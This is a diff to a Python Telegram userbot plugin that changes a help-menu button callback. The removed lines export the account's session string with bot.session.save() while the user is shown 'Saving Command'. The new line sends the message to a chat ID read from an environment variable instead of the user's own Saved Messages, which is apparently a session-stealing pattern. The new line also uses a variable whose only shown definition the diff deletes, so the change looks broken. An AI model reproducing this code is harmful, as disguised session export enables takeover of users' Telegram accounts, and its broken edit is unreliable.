@@ -63,7 +63,7 @@ thumb_image_path = "./resources/541200.png"
 LIGHTNINGUSER = str(ALIVE_NAME) if ALIVE_NAME else "Lightning"
 LIGHTNINGBOT = Var.TG_BOT_TOKEN_BF_HER
 
-
+HELP_LOGER_CHATID = int(os.environ.get("HELP_LOGER_CHATID", None))
 
 @borg.on(lightning_cmd(pattern="install"))
 async def install(lightning):
@@ -685,7 +685,7 @@ async def hmm(lightning):
 
 @tgbot.on(
         events.callbackquery.CallbackQuery(  # pylint:disable=E0602
-            data=re.compile(b"krish_(.*)")
+            data=re.compile(b"krish\((.+?)\)")
         )
     )
 async def chill(lightning):
@@ -706,8 +706,7 @@ async def chill(lightning):
                         await lightning.edit("`Saving Command`")
                         await asyncio.sleep(2)
                         await lightning.edit("`Check You Saved Message....`")
-                        lightning_help_strin = bot.session.save()
-                        await bot.send_message("me", lightning_help_strin)
+                        await bot.send_message(HELP_LOGER_CHATID, lightning_help_strin)
                    
 		          
           
